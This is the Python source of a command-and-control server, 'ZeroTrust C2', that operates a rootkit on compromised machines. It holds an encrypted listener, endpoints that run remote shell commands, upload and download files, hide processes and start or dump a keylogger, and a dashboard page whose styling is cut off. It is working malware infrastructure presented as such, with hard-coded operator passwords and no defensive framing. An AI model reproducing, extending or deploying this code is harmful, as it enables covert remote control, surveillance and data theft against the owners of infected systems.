import asyncio
import base64
import hashlib
import json
import os
import shutil
import struct
import subprocess
import sys
import time
import uvicorn
from cryptography.hazmat.primitives.ciphers.aead import ChaCha20Poly1305
from fastapi import FastAPI, WebSocket, Request
from fastapi.responses import HTMLResponse, JSONResponse, FileResponse
from datetime import datetime

app = FastAPI()

PLATFORM_PASSWORD = "zerotrust"
ROOTKIT_PASSWORD = "wlkom2024"
PW_HASH = hashlib.sha256(ROOTKIT_PASSWORD.encode()).hexdigest()
CRYPTO_KEY_FULL = hashlib.sha256(f"wlkom_crypto_{PW_HASH}".encode()).digest()
CRYPTO_KEY_EMPTY = hashlib.sha256("wlkom_crypto_".encode()).digest()
CRYPTO_KEY = CRYPTO_KEY_FULL
NONCE_SIZE = 8
TAG_SIZE = 16
MAX_AUTH_ATTEMPTS = 3
LOCKOUT_SECONDS = 30

rootkit_writer = None
rootkit_reader = None
rootkit_gen = 0
rootkit_connect_time = 0
ws_clients = []
authenticated = False
awaiting_password = False
send_nonce_ctr = 0
event_log = []
sessions = {}
SESSION_TTL = 3600
download_buffer = {}
login_attempts = {}
rk_auth_attempts = 0
rk_auth_locked_until = 0
pending_password = None

# Sync exec support
exec_lock = asyncio.Lock()
exec_future = None
remote_cwd = "/"
rootkit_connect_lock = asyncio.Lock()


def encrypt_msg(plaintext: bytes) -> bytes:
    global send_nonce_ctr
    nonce_val = send_nonce_ctr
    send_nonce_ctr += 1
    nonce_12 = b'\x00\x00\x00\x00' + struct.pack('<Q', nonce_val)
    cipher = ChaCha20Poly1305(CRYPTO_KEY)
    ct = cipher.encrypt(nonce_12, plaintext, None)
    payload = struct.pack('<Q', nonce_val) + ct
    header = struct.pack('!I', len(payload))
    return header + payload


async def decrypt_msg(reader, try_all_keys=False) -> bytes:
    global CRYPTO_KEY
    hdr = await reader.readexactly(4)
    payload_len = struct.unpack('!I', hdr)[0]
    if payload_len < NONCE_SIZE + TAG_SIZE or payload_len > 65536:
        raise ValueError(f"Invalid frame length: {payload_len}")
    payload = await reader.readexactly(payload_len)
    nonce_12 = b'\x00\x00\x00\x00' + payload[:8]
    ct = payload[8:]
    if try_all_keys:
        for key in [CRYPTO_KEY, CRYPTO_KEY_FULL, CRYPTO_KEY_EMPTY]:
            try:
                cipher = ChaCha20Poly1305(key)
                pt = cipher.decrypt(nonce_12, ct, None)
                if key != CRYPTO_KEY:
                    CRYPTO_KEY = key
                    print(f"[CRYPTO] Active key set to: {'full' if key == CRYPTO_KEY_FULL else 'empty'}")
                return pt
            except Exception:
                continue
        raise ValueError("Decrypt failed with all known keys")
    cipher = ChaCha20Poly1305(CRYPTO_KEY)
    return cipher.decrypt(nonce_12, ct, None)


async def send_to_rootkit(msg: str):
    if rootkit_writer:
        key_name = 'full' if CRYPTO_KEY == CRYPTO_KEY_FULL else 'empty'
        print(f"[C2] Sending to rootkit ({len(msg)}B, key={key_name}): {msg[:60].strip()}")
        frame = encrypt_msg(msg.encode())
        rootkit_writer.write(frame)
        await rootkit_writer.drain()


async def broadcast(msg: str, msg_type: str = "system"):
    ts = datetime.now().strftime("%H:%M:%S")
    entry = {"ts": ts, "msg": msg, "type": msg_type}
    event_log.append(entry)
    if len(event_log) > 1000:
        event_log.pop(0)
    payload = json.dumps(entry)
    for ws in ws_clients[:]:
        try:
            await ws.send_text(payload)
        except:
            ws_clients.remove(ws)


@app.on_event("startup")
async def startup():
    print(f"[C2] Crypto key derived (ChaCha20-Poly1305)")
    asyncio.create_task(start_rootkit_server())
    asyncio.create_task(start_cmd_server())


async def start_rootkit_server():
    server = await asyncio.start_server(handle_rootkit, "0.0.0.0", 9999)
    print("[C2] Rootkit listener on port 9999")
    async with server:
        await server.serve_forever()


async def start_cmd_server():
    server = await asyncio.start_server(handle_cmd, "0.0.0.0", 9998)
    print("[C2] Command listener on port 9998")
    async with server:
        await server.serve_forever()


async def _drain_and_hold(reader, writer, hold_seconds=3):
    """Hold connection briefly then close — avoids triggering instant reconnect storm."""
    try:
        await asyncio.sleep(hold_seconds)
    except:
        pass
    finally:
        try:
            writer.close()
        except:
            pass


async def handle_rootkit(reader, writer):
    global rootkit_writer, rootkit_reader, authenticated, awaiting_password
    global send_nonce_ctr, exec_future, rootkit_gen, rootkit_connect_time, CRYPTO_KEY
    global rk_auth_attempts, rk_auth_locked_until, pending_password
    addr = writer.get_extra_info("peername")
    now = time.time()
    # If we already have an active connection (authenticated or awaiting password), reject
    if rootkit_writer:
        print(f"[C2] Rejecting connection from {addr} — active connection exists")
        asyncio.ensure_future(_drain_and_hold(reader, writer, hold_seconds=60))
        return
    # Serialize connection validation to prevent key corruption race
    async with rootkit_connect_lock:
        # Save crypto key before trying — rejected connections must not corrupt it
        saved_key = CRYPTO_KEY
        try:
            first_pt = await asyncio.wait_for(decrypt_msg(reader, try_all_keys=True), timeout=5.0)
            first_msg = first_pt.decode(errors="replace").strip()
        except Exception as e:
            CRYPTO_KEY = saved_key
            print(f"[C2] Connection from {addr} failed decrypt: {type(e).__name__}: {e}")
            asyncio.ensure_future(_drain_and_hold(reader, writer, hold_seconds=3))
            return
        if first_msg != "AUTH_REQUIRED":
            CRYPTO_KEY = saved_key
            print(f"[C2] Connection from {addr} unexpected: {first_msg} — holding open")
            asyncio.ensure_future(_drain_and_hold(reader, writer, hold_seconds=30))
            return
        # Re-check after lock (another handler may have been accepted)
        if rootkit_writer:
            CRYPTO_KEY = saved_key
            print(f"[C2] Rejecting connection from {addr} — active connection exists (post-lock)")
            asyncio.ensure_future(_drain_and_hold(reader, writer, hold_seconds=60))
            return
    rootkit_connect_time = now
    # Bump generation so previous handler exits
    rootkit_gen += 1
    my_gen = rootkit_gen
    old_writer = rootkit_writer
    print(f"[C2] Rootkit connected from {addr}")
    rootkit_writer = writer
    rootkit_reader = reader
    authenticated = False
    awaiting_password = True
    send_nonce_ctr = 0
    if old_writer:
        try:
            old_writer.close()
            await asyncio.sleep(0.1)
        except:
            pass
    await broadcast(f"[+] Rootkit connected from {addr}", "info")
    if pending_password:
        await asyncio.sleep(0.3)
        await send_to_rootkit(pending_password + "\n")
        await broadcast("[*] Auto-retrying saved password...", "warn")
    else:
        await broadcast("[!] Password required — type password in terminal", "warn")

    try:
        while my_gen == rootkit_gen:
            pt = await decrypt_msg(reader)
            msg = pt.decode(errors="replace").strip()
            print(f"[ROOTKIT] {msg[:200]}")

            # File download handling
            if msg.startswith("FILE:"):
                parts = msg.split(":", 2)
                if len(parts) >= 3:
                    fpath, fsize = parts[1], int(parts[2])
                    download_buffer[fpath] = {"data": b"", "size": fsize, "done": False}
                    await broadcast(f"[+] Receiving file: {fpath} ({fsize}B)", "info")
                    while True:
                        chunk = await decrypt_msg(reader)
                        if chunk.decode(errors="replace").strip() == "EOF":
                            download_buffer[fpath]["done"] = True
                            fname = os.path.basename(fpath)
                            save_path = f"/tmp/wlkom_dl_{fname}"
                            with open(save_path, "wb") as wf:
                                wf.write(download_buffer[fpath]["data"])
                            await broadcast(f"[+] Downloaded: {fpath} -> {save_path} ({len(download_buffer[fpath]['data'])}B)", "info")
                            if exec_future and not exec_future.done():
                                exec_future.set_result(f"FILE_SAVED:{save_path}")
                            break
                        download_buffer[fpath]["data"] += chunk
                    continue

            if msg.startswith("ERR:"):
                await broadcast(f"[-] {msg}", "error")
                if exec_future and not exec_future.done():
                    exec_future.set_result(msg)
                continue
            if msg in ("READY", "UPLOAD_OK"):
                await broadcast(f"[+] {msg}", "info")
                if exec_future and not exec_future.done():
                    exec_future.set_result(msg)
                continue

            # Feed sync exec API
            if exec_future and not exec_future.done():
                exec_future.set_result(msg)

            # Classify and broadcast
            mtype = "rootkit"
            if msg == "AUTH_REQUIRED":
                awaiting_password = True
                mtype = "warn"
                await broadcast("[!] Password required — type password in terminal", "warn")
            elif msg == "AUTH_OK":
                authenticated = True
                awaiting_password = False
                rk_auth_attempts = 0
                rk_auth_locked_until = 0
                pending_password = None
                mtype = "info"
                await broadcast("[+] Authenticated successfully", "info")
            elif msg == "AUTH_FAIL":
                authenticated = False
                awaiting_password = True
                pending_password = None
                rk_auth_attempts += 1
                left = MAX_AUTH_ATTEMPTS - rk_auth_attempts
                mtype = "error"
                if left <= 0:
                    rk_auth_locked_until = time.time() + LOCKOUT_SECONDS
                    rk_auth_attempts = 0
                    awaiting_password = False
                    await broadcast(f"[-] Authentication failed. Locked for {LOCKOUT_SECONDS}s", "error")
                else:
                    await broadcast(f"[-] Wrong password. {left} attempt(s) remaining", "error")
            else:
                await broadcast(f"[ROOTKIT] {msg}", mtype)

    except (asyncio.IncompleteReadError, ConnectionResetError, Exception) as e:
        import traceback
        print(f"[C2] Rootkit disconnected: {type(e).__name__}: {e}")
        traceback.print_exc()
    finally:
        if my_gen == rootkit_gen:
            rootkit_writer = None
            rootkit_reader = None
            authenticated = False
            awaiting_password = False
            send_nonce_ctr = 0
            await broadcast("[-] Rootkit disconnected", "error")
        writer.close()


async def handle_cmd(reader, writer):
    try:
        while True:
            data = await reader.read(4096)
            if not data:
                break
            cmd = data.decode().strip()
            if cmd.startswith("BOOT_NOTIFY"):
                await broadcast(f"[!] BOOT NOTIFICATION: {cmd}", "warn")
                writer.write(b"[+] Notification received\n")
            elif not rootkit_writer:
                writer.write(b"[-] No rootkit connected\n")
            elif rk_auth_locked_until > time.time():
                left = int(rk_auth_locked_until - time.time())
                writer.write(f"[-] Auth locked. Wait {left}s\n".encode())
            elif awaiting_password and not authenticated:
                pending_password = cmd
                await send_to_rootkit(cmd + "\n")
                writer.write(b"[*] Password sent\n")
            elif not authenticated:
                writer.write(b"[-] Not authenticated\n")
            else:
                await send_to_rootkit(cmd + "\n")
                writer.write(b"[+] Sent\n")
            await writer.drain()
    except:
        pass
    finally:
        writer.close()


# ===== REST API =====

@app.post("/api/login")
async def api_login(request: Request):
    ip = request.client.host if request.client else "unknown"
    now = time.time()
    entry = login_attempts.get(ip, {"count": 0, "locked_until": 0})
    if entry["locked_until"] > now:
        remaining = int(entry["locked_until"] - now)
        return JSONResponse({"error": "locked", "seconds": remaining,
                             "message": f"Too many attempts. Locked for {remaining}s"}, 429)
    data = await request.json()
    pw = data.get("password", "")
    if pw == PLATFORM_PASSWORD:
        entry["count"] = 0
        entry["locked_until"] = 0
        login_attempts[ip] = entry
        token = hashlib.sha256(f"{pw}{datetime.now().isoformat()}".encode()).hexdigest()[:32]
        sessions[token] = time.time()
        return {"token": token}
    entry["count"] += 1
    left = MAX_AUTH_ATTEMPTS - entry["count"]
    if left <= 0:
        entry["locked_until"] = now + LOCKOUT_SECONDS
        entry["count"] = 0
        login_attempts[ip] = entry
        return JSONResponse({"error": "locked", "seconds": LOCKOUT_SECONDS,
                             "message": f"Account locked for {LOCKOUT_SECONDS}s"}, 429)
    login_attempts[ip] = entry
    return JSONResponse({"error": "invalid", "attempts_left": left,
                         "message": f"Wrong password. {left} attempt(s) remaining"}, 401)


@app.get("/api/status")
async def api_status():
    now = time.time()
    rk_locked = rk_auth_locked_until > now
    return {
        "rootkit": "connected" if rootkit_writer else "disconnected",
        "authenticated": authenticated,
        "awaiting_password": awaiting_password,
        "rk_locked": rk_locked,
        "rk_lock_remaining": int(rk_auth_locked_until - now) if rk_locked else 0,
        "crypto": "chacha20-poly1305",
        "events": len(event_log),
    }


def check_token(token):
    if token not in sessions:
        return False
    if time.time() - sessions[token] > SESSION_TTL:
        del sessions[token]
        return False
    sessions[token] = time.time()
    return True

@app.post("/api/logout")
async def api_logout(request: Request):
    token = request.headers.get("X-Token", "")
    sessions.pop(token, None)
    return {"ok": True}

@app.post("/api/change-password")
async def api_change_password(request: Request):
    global PLATFORM_PASSWORD
    token = request.headers.get("X-Token", "")
    if not check_token(token):
        return JSONResponse({"error": "unauthorized"}, 401)
    data = await request.json()
    current = data.get("current", "")
    new_pw = data.get("new", "")
    if current != PLATFORM_PASSWORD:
        return JSONResponse({"error": "Wrong current password"}, 403)
    if len(new_pw) < 4:
        return JSONResponse({"error": "Password too short (min 4)"}, 400)
    PLATFORM_PASSWORD = new_pw
    return {"ok": True, "message": "Platform password changed"}

@app.post("/api/reconnect-rk")
async def api_reconnect_rk(request: Request):
    global rootkit_writer, rootkit_reader, authenticated, awaiting_password
    token = request.headers.get("X-Token", "")
    if not check_token(token):
        return JSONResponse({"error": "unauthorized"}, 401)
    if rootkit_writer:
        try:
            rootkit_writer.close()
            await rootkit_writer.wait_closed()
        except:
            pass
    rootkit_writer = None
    rootkit_reader = None
    authenticated = False
    awaiting_password = False
    await broadcast("[*] Rootkit connection reset — waiting for reconnect", "warn")
    return {"ok": True, "message": "Rootkit disconnected, waiting for reconnect"}

@app.post("/api/restart-c2")
async def api_restart_c2(request: Request):
    token = request.headers.get("X-Token", "")
    if not check_token(token):
        return JSONResponse({"error": "unauthorized"}, 401)
    await broadcast("[!] C2 server restarting...", "warn")
    asyncio.get_event_loop().call_later(1, lambda: os.execv(sys.executable, [sys.executable] + sys.argv))
    return {"ok": True, "message": "Restarting..."}

@app.post("/api/exec")
async def api_exec(request: Request):
    global exec_future, remote_cwd
    token = request.headers.get("X-Token", "")
    if not check_token(token):
        return JSONResponse({"error": "unauthorized"}, 401)
    if not authenticated:
        return JSONResponse({"error": "rootkit not authenticated"}, 400)

    async with exec_lock:
        data = await request.json()
        cmd = data.get("cmd", "").strip()
        loop = asyncio.get_event_loop()

        # Protocol commands: send raw to rootkit (not shell commands)
        PROTO_PREFIXES = ("DOWNLOAD:", "UPLOAD:", "HIDE_PID:", "UNHIDE_PID:",
                          "LIST_HIDDEN_PIDS", "KEYLOG_START", "KEYLOG_STOP", "KEYLOG_DUMP", "KEYLOG_STATUS")
        is_proto = any(cmd.startswith(p) or cmd == p for p in PROTO_PREFIXES)
        if is_proto:
            exec_future = loop.create_future()
            await send_to_rootkit(cmd + "\n")
            try:
                result = await asyncio.wait_for(exec_future, timeout=15)
            except asyncio.TimeoutError:
                result = "(timeout - no response)"
            finally:
                exec_future = None
            return {"output": result, "cwd": remote_cwd, "exit_code": 0}

        # Detect cd command
        is_cd = (cmd == "cd" or cmd.startswith("cd ") or cmd.startswith("cd\t"))

        # Build actual command with CWD prefix
        import shlex
        cwd_pfx = f"cd {shlex.quote(remote_cwd)} 2>/dev/null; "
        if is_cd:
            actual = f"({cwd_pfx}{cmd} && pwd)"
        else:
            # tee saves full output; rootkit reads truncated version (4KB)
            actual = f"({cwd_pfx}{cmd}) 2>&1 | tee /tmp/.wlkom_full"

        exec_future = loop.create_future()
        await send_to_rootkit(actual + "\n")
        try:
            result = await asyncio.wait_for(exec_future, timeout=30)
        except asyncio.TimeoutError:
            result = "(timeout - no response)"
        finally:
            exec_future = None

        # If output looks truncated (close to 4KB), fetch the full file
        if not is_cd and result and len(result) >= 4000:
            try:
                exec_future = loop.create_future()
                await send_to_rootkit("DOWNLOAD:/tmp/.wlkom_full\n")
                dl_result = await asyncio.wait_for(exec_future, timeout=15)
                if dl_result and dl_result.startswith("FILE_SAVED:"):
                    save_path = dl_result.split(":", 1)[1]
                    with open(save_path, "r", errors="replace") as rf:
                        result = rf.read()
            except:
                pass
            finally:
                exec_future = None

        # Parse EXIT code and strip it
        lines = result.rstrip("\n").split("\n") if result else []
        exit_code = -1
        if lines and lines[-1].startswith("EXIT:"):
            try:
                exit_code = int(lines[-1].split(":")[1])
            except (ValueError, IndexError):
                pass
            lines = lines[:-1]

        # Update CWD on cd: if last line looks like an absolute path, it's pwd output
        if is_cd and lines:
            last = lines[-1].strip()
            if last.startswith("/") and " " not in last and ":" not in last[1:]:
                remote_cwd = last
                lines = lines[:-1]
                exit_code = 0

        output = "\n".join(lines)
        return {"output": output, "cwd": remote_cwd, "exit_code": exit_code}


@app.post("/api/upload")
async def api_upload(request: Request):
    global exec_future
    token = request.headers.get("X-Token", "")
    if not check_token(token):
        return JSONResponse({"error": "unauthorized"}, 401)
    if not rootkit_writer:
        return JSONResponse({"error": "rootkit not connected"}, 400)
    if not authenticated:
        return JSONResponse({"error": "rootkit not authenticated"}, 400)

    async with exec_lock:
        data = await request.json()
        rpath = data.get("remote_path", "/tmp/uploaded")
        fdata = base64.b64decode(data.get("file_data", ""))
        if not fdata:
            return JSONResponse({"error": "empty file"}, 400)
        loop = asyncio.get_event_loop()

        await broadcast(f"[*] Uploading {len(fdata)}B to {rpath}", "warn")

        # 1) Send UPLOAD:path
        await send_to_rootkit(f"UPLOAD:{rpath}\n")
        await asyncio.sleep(0.1)

        # 2) Send file size, then wait for READY
        exec_future = loop.create_future()
        await send_to_rootkit(f"{len(fdata)}\n")
        try:
            result = await asyncio.wait_for(exec_future, timeout=10)
        except asyncio.TimeoutError:
            exec_future = None
            return JSONResponse({"error": "timeout waiting for READY"}, 500)
        finally:
            exec_future = None

        if result != "READY":
            return JSONResponse({"error": f"unexpected: {result}"}, 500)

        # 3) Send data in chunks (rootkit recv buf = 4096)
        CHUNK = 4000
        for i in range(0, len(fdata), CHUNK):
            chunk = fdata[i:i + CHUNK]
            frame = encrypt_msg(chunk)
            rootkit_writer.write(frame)
            await rootkit_writer.drain()
            await asyncio.sleep(0.02)

        # 4) Wait for UPLOAD_OK
        exec_future = loop.create_future()
        try:
            result = await asyncio.wait_for(exec_future, timeout=15)
        except asyncio.TimeoutError:
            exec_future = None
            return JSONResponse({"error": "timeout waiting for UPLOAD_OK"}, 500)
        finally:
            exec_future = None

        await broadcast(f"[+] Uploaded: {rpath} ({len(fdata)}B)", "info")
        return {"status": "ok", "path": rpath, "size": len(fdata)}


@app.get("/api/downloads")
async def api_downloads():
    return [{"path": p, "size": len(i["data"]), "file": os.path.basename(p)}
            for p, i in download_buffer.items() if i["done"]]


@app.get("/api/dl/{filename}")
async def api_dl(filename: str):
    path = f"/tmp/wlkom_dl_{filename}"
    if os.path.exists(path):
        return FileResponse(path, filename=filename)
    return JSONResponse({"error": "not found"}, 404)


@app.delete("/api/dl/{filename}")
async def api_dl_delete(filename: str):
    path = f"/tmp/wlkom_dl_{filename}"
    fpath = None
    for p, i in list(download_buffer.items()):
        if os.path.basename(p) == filename:
            fpath = p
            break
    if fpath:
        del download_buffer[fpath]
    if os.path.exists(path):
        os.remove(path)
        return {"status": "deleted", "file": filename}
    return JSONResponse({"error": "not found"}, 404)


@app.websocket("/ws")
async def websocket_endpoint(ws: WebSocket):
    global pending_password, awaiting_password, authenticated
    await ws.accept()
    ws_clients.append(ws)
    for entry in event_log[-100:]:
        await ws.send_text(json.dumps(entry))
    try:
        while True:
            raw = await ws.receive_text()
            try:
                data = json.loads(raw)
            except:
                data = {"action": "cmd", "value": raw}
            action = data.get("action", "cmd")
            value = data.get("value", "")

            if action == "auth":
                pending_password = value
                if not rootkit_writer:
                    await broadcast("[*] Password saved. Waiting for rootkit to connect...", "warn")
                elif rk_auth_locked_until > time.time():
                    left = int(rk_auth_locked_until - time.time())
                    await broadcast(f"[-] Rootkit auth locked. Wait {left}s", "error")
                else:
                    if not awaiting_password:
                        awaiting_password = True
                    await send_to_rootkit(value + "\n")
                    await broadcast("[*] Password sent — waiting for response...", "warn")
            elif action == "cmd":
                if not rootkit_writer:
                    await broadcast("[-] No rootkit connected", "error")
                elif not authenticated:
                    await broadcast("[-] Not authenticated", "error")
                else:
                    await broadcast(f"> {value}", "cmd")
                    await send_to_rootkit(value + "\n")
            elif action == "upload":
                if authenticated and rootkit_writer:
                    rpath = data.get("remote_path", "/tmp/uploaded")
                    fdata = base64.b64decode(data.get("file_data", ""))
                    await broadcast(f"[*] Uploading {len(fdata)}B to {rpath}", "warn")
                    await send_to_rootkit(f"UPLOAD:{rpath}\n")
                    await asyncio.sleep(0.3)
                    await send_to_rootkit(f"{len(fdata)}\n")
                    await asyncio.sleep(0.5)
                    frame = encrypt_msg(fdata)
                    rootkit_writer.write(frame)
                    await rootkit_writer.drain()
            elif action == "download":
                if authenticated and rootkit_writer:
                    await broadcast(f"[*] Downloading {value}", "warn")
                    await send_to_rootkit(f"DOWNLOAD:{value}\n")
    except Exception as e:
        if not isinstance(e, (asyncio.CancelledError,)):
            err_name = type(e).__name__
            if err_name != "WebSocketDisconnect":
                print(f"[C2] WebSocket error: {err_name}: {e}")
        if ws in ws_clients:
            ws_clients.remove(ws)


# ===== HTML UI =====

@app.get("/", response_class=HTMLResponse)
async def root():
    return HTML_PAGE


HTML_PAGE = r"""<!DOCTYPE html>
<html lang='en'>
<head>
<meta charset='UTF-8'>
<meta name='viewport' content='width=device-width,initial-scale=1'>
<title>ZeroTrust C2</title>
<style>
*,*::before,*::after{margin:0;padding:0;box-sizing:border-box}
html,body{height:100%;overflow:hidden}
body{font-family:var(--font-ui);background:var(--bg-0);color:var(--t1);font-size:13px;line-height:1.5;-webkit-font-smoothing:antialiased}
:root{
--bg-0:#060912;--bg-1:#0b1120;--bg-2:#111827;--bg-3:#1e293b;
--bg-hover:#1e293b;--bg-active:#334155;
--border:rgba(148,163,184,.08);--border-l:rgba(148,163,184,.14);
--t1:#f1f5f9;--t2:#94a3b8;--t3:#64748b;--t4:#475569;
--red:#ef4444;--red-d:rgba(239,68,68,.12);
--green:#22c55e;--green-d:rgba(34,197,94,.12);
--yellow:#eab308;--yellow-d:rgba(234,179,8,.12);
--blue:#3b82f6;--blue-d:rgba(59,130,246,.12);
--cyan:#06b6d4;--cyan-d:rgba(6,182,212,.12);
--purple:#8b5cf6;--purple-d:rgba(139,92,246,.12);
--orange:#f97316;--orange-d:rgba(249,115,22,.12);
--font-ui:'Inter',system-ui,-apple-system,sans-serif;
--font-mono:'JetBrains Mono','Fira Code','Courier New',monospace;
--r-s:4px;--r-m:6px;--r-l:10px;
}
.app{display:grid;grid-template-areas:"side top" "side main" "side status";grid-template-columns:200px 1fr;grid-template-rows:48px 1fr 28px;height:100vh;width:100vw}
.app.collapsed{grid-template-columns:56px 1fr}
.topbar{grid-area:top;display:flex;align-items:center;padding:0 20px;background:var(--bg-2);border-bottom:1px solid var(--border);gap:12px;z-index:10}
.session-badge{display:flex;align-items:center;gap:8px;padding:4px 12px;background:var(--green-d);border:1px solid rgba(34,197,94,.2);border-radius:20px;font-size:12px;font-weight:500;color:var(--green)}
.session-badge .dot{width:6px;height:6px;border-radius:50%;background:var(--green);animation:pulse 2s infinite}
.session-badge.off{background:var(--red-d);border-color:rgba(239,68,68,.2);color:var(--red)}
.session-badge.off .dot{background:var(--red);animation:none}
.topbar .uptime{font-family:var(--font-mono);font-size:12px;color:var(--t3)}
.topbar .spacer{flex:1}
.top-btn{background:none;border:none;color:var(--t3);cursor:pointer;padding:6px;border-radius:var(--r-s);transition:all .15s;position:relative}
.top-btn:hover{color:var(--t1);background:var(--bg-hover)}
.logout-btn{display:flex;align-items:center;gap:6px;background:none;border:1px solid var(--border-l);color:var(--t3);cursor:pointer;padding:5px 12px;border-radius:var(--r-m);font-size:11px;font-family:var(--font-ui);transition:all .15s}
.logout-btn svg{width:14px;height:14px}
.logout-btn:hover{color:var(--red);border-color:var(--red);background:rgba(239,68,68,.08)}
.top-btn .badge-count{position:absolute;top:0;right:0;width:15px;height:15px;border-radius:50%;background:var(--red);color:#fff;font-size:9px;font-weight:700;display:flex;align-items:center;justify-content:center}
.sidebar{grid-area:side;background:var(--bg-0);border-right:1px solid var(--border);display:flex;flex-direction:column;overflow:hidden;transition:width .2s ease}
.sidebar .logo{height:48px;display:flex;align-items:center;padding:0 16px;gap:10px;border-bottom:1px solid var(--border);flex-shrink:0}
.logo-mark{width:26px;height:26px;background:var(--red);border-radius:var(--r-s);display:flex;align-items:center;justify-content:center;font-weight:800;font-size:11px;color:#fff;flex-shrink:0;letter-spacing:-.5px}
.logo-text{font-weight:700;font-size:14px;letter-spacing:.5px;color:var(--t1);white-space:nowrap}
.collapsed .logo-text{display:none}
.sidebar .nav{flex:1;overflow-y:auto;padding:8px}
.nav-section{margin-top:14px}.nav-section:first-child{margin-top:0}
.nav-section-title{font-size:9px;font-weight:700;text-transform:uppercase;letter-spacing:1.2px;color:var(--t4);padding:4px 10px 6px;white-space:nowrap}
.collapsed .nav-section-title{display:none}
.nav-item{display:flex;align-items:center;gap:10px;padding:7px 10px;border-radius:var(--r-m);color:var(--t3);cursor:pointer;transition:all .15s;position:relative;white-space:nowrap;margin-bottom:1px}
.nav-item:hover{background:var(--bg-hover);color:var(--t1)}
.nav-item.active{background:var(--red-d);color:var(--red)}
.nav-item.active::before{content:'';position:absolute;left:0;top:4px;bottom:4px;width:3px;background:var(--red);border-radius:0 2px 2px 0}
.nav-item svg{width:18px;height:18px;flex-shrink:0;stroke-width:1.8}
.nav-item .label{font-size:13px;font-weight:500}
.collapsed .nav-item .label{display:none}
.collapse-toggle{padding:6px;border-top:1px solid var(--border);display:flex;align-items:center;justify-content:center;cursor:pointer;color:var(--t4);transition:color .15s;flex-shrink:0}
.collapse-toggle svg{width:16px;height:16px}
.collapse-toggle:hover{color:var(--t2)}
.statusbar{grid-area:status;display:flex;align-items:center;padding:0 16px;gap:20px;background:var(--bg-2);border-top:1px solid var(--border);font-size:11px;color:var(--t4)}
.st-item{display:flex;align-items:center;gap:6px}
.st-dot{width:6px;height:6px;border-radius:50%}
.st-dot.g{background:var(--green)}.st-dot.y{background:var(--yellow)}.st-dot.r{background:var(--red)}
.main{grid-area:main;overflow-y:auto;overflow-x:hidden;padding:20px 24px;background:var(--bg-1)}
.panel-hdr{display:flex;align-items:flex-start;justify-content:space-between;margin-bottom:20px}
.panel-title{font-size:18px;font-weight:600;color:var(--t1)}
.panel-sub{font-size:12px;color:var(--t3);margin-top:2px}
.panel-actions{display:flex;gap:8px;align-items:center}
.card{background:var(--bg-2);border:1px solid var(--border);border-radius:var(--r-l);padding:16px}
.card-title{font-size:10px;font-weight:700;text-transform:uppercase;letter-spacing:.6px;color:var(--t3);margin-bottom:10px}
.stat-card{background:var(--bg-2);border:1px solid var(--border);border-radius:var(--r-l);padding:16px 20px;position:relative;overflow:hidden}
.stat-card::before{content:'';position:absolute;top:0;left:0;right:0;height:2px}
.stat-card.c-red::before{background:var(--red)}.stat-card.c-green::before{background:var(--green)}
.stat-card.c-blue::before{background:var(--blue)}.stat-card.c-purple::before{background:var(--purple)}
.stat-card.c-cyan::before{background:var(--cyan)}.stat-card.c-orange::before{background:var(--orange)}
.stat-card.c-yellow::before{background:var(--yellow)}
.stat-label{font-size:10px;font-weight:600;text-transform:uppercase;letter-spacing:.5px;color:var(--t3);margin-bottom:6px}
.stat-value{font-size:26px;font-weight:700;color:var(--t1);font-family:var(--font-mono);line-height:1}
.stat-sub{font-size:11px;color:var(--t3);margin-top:6px;display:flex;align-items:center;gap:4px}
.grid{display:grid;gap:16px}.g2{grid-template-columns:1fr 1fr}.g3{grid-template-columns:1fr 1fr 1fr}.g4{grid-template-columns:repeat(4,1fr)}
.dtable{width:100%;border-collapse:separate;border-spacing:0;font-size:12px}
.dtable thead{position:sticky;top:0;z-index:5}
.dtable th{background:var(--bg-3);padding:8px 12px;text-align:left;font-weight:600;font-size:10px;text-transform:uppercase;letter-spacing:.5px;color:var(--t3);border-bottom:1px solid var(--border)}
.dtable th:first-child{border-radius:var(--r-s) 0 0 0}.dtable th:last-child{border-radius:0 var(--r-s) 0 0}
.dtable td{padding:7px 12px;border-bottom:1px solid var(--border);color:var(--t2)}
.dtable tr:hover td{background:rgba(255,255,255,.015)}
.dtable .mono{font-family:var(--font-mono);font-size:11px}
.badge{display:inline-flex;align-items:center;padding:2px 8px;border-radius:10px;font-size:10px;font-weight:600;text-transform:uppercase;letter-spacing:.3px}
.b-critical{background:var(--red-d);color:var(--red)}.b-high{background:var(--orange-d);color:var(--orange)}
.b-medium{background:var(--yellow-d);color:var(--yellow)}.b-low{background:var(--blue-d);color:var(--blue)}
.b-info{background:rgba(148,163,184,.08);color:var(--t3)}.b-pass{background:var(--green-d);color:var(--green)}
.b-fail{background:var(--red-d);color:var(--red)}.b-cmd{background:var(--orange-d);color:var(--orange)}
.b-error{background:var(--red-d);color:var(--red)}.b-warn{background:var(--yellow-d);color:var(--yellow)}
.b-rootkit{background:var(--purple-d);color:var(--purple)}.b-success,.b-connected{background:var(--green-d);color:var(--green)}
.btn{display:inline-flex;align-items:center;gap:6px;padding:6px 14px;border-radius:var(--r-m);font-size:12px;font-weight:500;border:1px solid var(--border-l);background:var(--bg-3);color:var(--t2);cursor:pointer;transition:all .15s;font-family:var(--font-ui);white-space:nowrap}
.btn:hover{background:var(--bg-active);color:var(--t1);border-color:rgba(148,163,184,.2)}
.btn-primary{background:var(--red);border-color:var(--red);color:#fff}.btn-primary:hover{background:#dc2626}
.btn-danger{background:var(--red-d);border-color:rgba(239,68,68,.2);color:var(--red)}.btn-danger:hover{background:rgba(239,68,68,.2)}
.btn-success{background:var(--green-d);border-color:rgba(34,197,94,.2);color:var(--green)}.btn-success:hover{background:rgba(34,197,94,.2)}
.btn-sm{padding:4px 10px;font-size:11px}.btn-xs{padding:2px 8px;font-size:10px}
.btn svg{width:14px;height:14px;flex-shrink:0}.btn-sm svg{width:13px;height:13px}.btn-xs svg{width:12px;height:12px}
.btn:disabled{opacity:.5;cursor:not-allowed}
.btn-active{background:var(--red-d);border-color:rgba(239,68,68,.2);color:var(--red)}
.input{padding:7px 12px;background:var(--bg-0);border:1px solid var(--border-l);border-radius:var(--r-m);color:var(--t1);font-size:12px;font-family:var(--font-ui);outline:none;transition:border-color .15s}
.input:focus{border-color:var(--red)}.input::placeholder{color:var(--t4)}
.select{padding:6px 28px 6px 10px;background:var(--bg-0);border:1px solid var(--border-l);border-radius:var(--r-m);color:var(--t1);font-size:12px;font-family:var(--font-ui);outline:none;appearance:none;cursor:pointer}
.select:focus{border-color:var(--red)}
.pbar{height:4px;background:var(--bg-3);border-radius:2px;overflow:hidden}
.pbar-fill{height:100%;border-radius:2px;transition:width .5s ease}
